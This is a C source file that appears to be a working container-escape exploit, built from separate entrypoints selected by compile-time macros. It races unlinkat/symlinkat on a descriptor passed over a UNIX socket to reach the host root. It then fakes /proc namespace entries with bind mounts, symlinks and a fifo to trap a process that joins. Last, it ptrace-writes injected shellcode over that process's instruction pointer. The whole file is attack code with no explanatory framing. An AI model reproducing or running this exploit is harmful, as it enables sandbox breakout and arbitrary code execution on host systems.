#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/ptrace.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/un.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define STR2(x) #x
#define STR(x) STR2(x)

#define DECL_STR(name, ...) \
    char name[1024] = {0};  \
    snprintf(name, sizeof name, __VA_ARGS__);

#define CHECK_CALL(func, ...) check(func(__VA_ARGS__), #func)

static void info(const char *fmt, ...) {
    va_list args;
    va_start(args, fmt);

    printf("[" STR(MAIN) "]  ");
    vprintf(fmt, args);
    printf("\n");
    fflush(stdout);

    va_end(args);
}

static int64_t check(int64_t err, const char *msg) {
    if (err == -1) {
        info("%s: %s", msg, strerror(errno));
        exit(0);
    }
    return err;
}

static long xptrace(enum __ptrace_request request, pid_t pid, uintptr_t addr, uintptr_t data) {
    errno = 0;
    long result = ptrace(request, pid, (void *)addr, (void *)data);
    if (result == -1 && errno != 0)
        check(result, "ptrace");
    return result;
}

static void create_socket(int *sock, struct sockaddr_un *addr, socklen_t *addrlen) {
    info("Creating socket");
    *sock = CHECK_CALL(socket, AF_UNIX, SOCK_STREAM, 0);

    info("Creating addr");
    memset(addr, 0, sizeof *addr);
    addr->sun_family = AF_UNIX;
    strncpy(addr->sun_path, "@" STR(RAND), sizeof addr->sun_path - 1);
    *addrlen = offsetof(struct sockaddr_un, sun_path) + strlen(addr->sun_path) + 1;
    addr->sun_path[0] = 0;
}

static void send_fd(int conn, int fd) {
    info("Preparing fd message");

    char iobuf[1] = {0};
    struct iovec io = {.iov_base = iobuf, .iov_len = sizeof iobuf};

    union {
        char buf[CMSG_SPACE(sizeof fd)];
        struct cmsghdr align;
    } u;
    memset(&u, 0, sizeof u);

    struct msghdr msg = {0};
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    msg.msg_control = u.buf;
    msg.msg_controllen = sizeof u.buf;

    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof fd);

    memcpy(CMSG_DATA(cmsg), &fd, sizeof fd);

    info("Sending fd");
    CHECK_CALL(sendmsg, conn, &msg, 0);
}

static int recv_fd(int conn) {
    info("Preparing for receive");
    int fd;

    char io_buf[1] = {0};
    struct iovec io = {.iov_base = io_buf, .iov_len = sizeof io_buf};

    union {
        char buf[CMSG_SPACE(sizeof fd)];
        struct cmsghdr align;
    } u;
    memset(&u, 0, sizeof u);

    struct msghdr msg = {0};
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    msg.msg_control = u.buf;
    msg.msg_controllen = sizeof u.buf;

    info("Receiving fd");
    CHECK_CALL(recvmsg, conn, &msg, 0);

    info("Extracting fd");
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    memcpy(&fd, CMSG_DATA(cmsg), sizeof fd);
    return fd;
}

static void setup_socket_and_send_fd(int fd) {
    int sock;
    struct sockaddr_un addr;
    socklen_t addrlen;
    create_socket(&sock, &addr, &addrlen);

    info("Binding");
    CHECK_CALL(bind, sock, &addr, addrlen);

    info("Listening");
    CHECK_CALL(listen, sock, 8);

    info("Accepting");
    int conn = CHECK_CALL(accept, sock, NULL, NULL);

    send_fd(conn, fd);

    close(conn);
    close(sock);
}

static int setup_socket_and_recv_fd(void) {
    int sock;
    struct sockaddr_un addr;
    socklen_t addrlen;
    create_socket(&sock, &addr, &addrlen);

    info("Connecting");
    int conn = CHECK_CALL(connect, sock, &addr, addrlen);

    int fd = recv_fd(conn);

    close(conn);
    return fd;
}

static void new_namespaces(void) {
    info("Creating new namespaces");
    int flags =
        CLONE_NEWCGROUP | CLONE_NEWIPC | CLONE_NEWNS | CLONE_NEWPID | CLONE_NEWUSER | CLONE_NEWUTS;
    CHECK_CALL(unshare, flags);
}

static void makedir(const char *dir) {
    info("Creating dir \"%s\"", dir);
    unlink(dir);
    rmdir(dir);
    CHECK_CALL(mkdir, dir, 0);
    CHECK_CALL(chmod, dir, 0755);
}

static void bindmount(const char *src, const char *dst) {
    info("Creating bind mount \"%s\" -> \"%s\"", dst, src);
    CHECK_CALL(mount, src, dst, NULL, MS_BIND | MS_REC, NULL);
}

static int get_cur_pid(void) {
    info("Reading current pid");
    char buf[1024] = {0};
    CHECK_CALL(readlink, "/proc/self", buf, sizeof buf);
    return strtol(buf, NULL, 10);
}

static void set_trap_for_join(int init_pid, int child_pid) {
    makedir("/tmp/oldproc_" STR(RAND));
    bindmount("/proc", "/tmp/oldproc_" STR(RAND));
    makedir("/tmp/newproc_" STR(RAND));
    bindmount("/tmp/newproc_" STR(RAND), "/proc");

    DECL_STR(dir1, "/proc/%d", init_pid)
    makedir(dir1);
    DECL_STR(dir2, "/proc/%d/ns", init_pid)
    makedir(dir2);

    DECL_STR(linkpath, "/proc/%d/ns/pid", init_pid)
    DECL_STR(target, "/tmp/oldproc_" STR(RAND) "/%d/ns/pid", child_pid)
    info("Linking pid ns \"%s\" -> \"%s\"", linkpath, target);
    CHECK_CALL(symlink, target, linkpath);

    DECL_STR(fifo, "/proc/%d/ns/uts", init_pid)
    info("Creating fifo \"%s\"", fifo);
    CHECK_CALL(mkfifo, fifo, 0755);
}

static void ptrace_write(pid_t pid, uintptr_t addr, uint8_t *data, size_t size) {
    size_t wordsz = sizeof(uintptr_t);
    if (size % wordsz) {
        info("ptrace_write: size not aligned");
        exit(0);
    }

    uintptr_t new_data[size / wordsz];
    memcpy(new_data, data, size);

    for (size_t i = 0; i < size / wordsz; i++)
        xptrace(PTRACE_POKETEXT, pid, addr + i * wordsz, new_data[i]);
}

// ----- entrypoints -----

static void do_sleep(void) {
    while (1)
        sleep(1);
}

static void do_sendfd(void) {
    info("Opening fd");
    int fd = CHECK_CALL(open, "/", 0);

    setup_socket_and_send_fd(fd);
    close(fd);
}

static void do_recvfd(void) {
    int fd = setup_socket_and_recv_fd();

    info("Starting race");
    while (unlinkat(fd, "../2", AT_REMOVEDIR))
        ;

    CHECK_CALL(symlinkat, "/", fd, "../2");
    info("Race done");

    close(fd);
}

static void do_escalate(void) {
    info("Checking that we won the race");
    CHECK_CALL(access, "/proc", F_OK);

    int init = get_cur_pid();
    info("Init pid: %d", init);

    new_namespaces();

    info("Forking");
    if (CHECK_CALL(fork)) {
        info("Parent done");
        do_sleep();
    }
    info("Child started");

    int child = get_cur_pid();
    info("Child pid: %d", child);

    set_trap_for_join(init, child);

    info("Waiting for victim to join");
    while (ptrace(PTRACE_ATTACH, 2, NULL, NULL))
        ;
    info("Attached to victim");
    CHECK_CALL(waitpid, 2, NULL, 0);

    info("Reading rip");
    struct user_regs_struct regs = {0};
    xptrace(PTRACE_GETREGS, 2, 0, (uintptr_t)&regs);

    info("Writing shellcode to %p", regs.rip);
    uint8_t shellcode[] = {SHELLCODE};
    ptrace_write(2, regs.rip, shellcode, sizeof shellcode);

    info("Detaching");
    xptrace(PTRACE_DETACH, 2, 0, 0);

    info("Opening fifo");
    DECL_STR(fifo, "/proc/%d/ns/uts", init)
    CHECK_CALL(open, fifo, O_WRONLY);

    do_sleep();
}

#define DO2(main) do_##main()
#define DO(X) DO2(X)

int main(void) {
    close(0);
    info("Started " STR(MAIN));
    DO(MAIN);
    info("Done");
    return 0;
}
